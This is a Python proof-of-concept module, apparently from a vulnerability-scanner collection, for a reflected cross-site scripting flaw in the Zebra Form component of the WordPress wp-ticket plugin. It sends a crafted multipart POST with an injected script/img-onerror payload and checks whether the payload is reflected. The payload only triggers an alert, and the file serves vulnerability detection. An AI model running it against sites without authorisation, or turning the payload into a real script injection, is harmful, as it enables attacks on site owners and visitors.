import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Wordpress Zebra Form XSS''',
        "description": '''''',
        "severity": "medium",
        "references": [
            "https://blog.wpscan.com/2021/02/15/zebra-form-xss-wordpress-vulnerability-affects-multiple-plugins.html"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "xss"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(/XSS-form/)%3E&control=upload"""
        method = "POST"
        data = """-----------------------------77916619616724262872902741074
Content-Disposition: form-data; name="upload"; filename="{{randstr}}.txt"
Content-Type: text/plain
Test
-----------------------------77916619616724262872902741074--"""
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Content-Type': 'multipart/form-data; boundary=---------------------------77916619616724262872902741074', 'Origin': 'null'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""</script><img src onerror=alert(/XSS-form/)>""" in resp0.text) and (resp0.status_code == 200) and ("""text/html""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url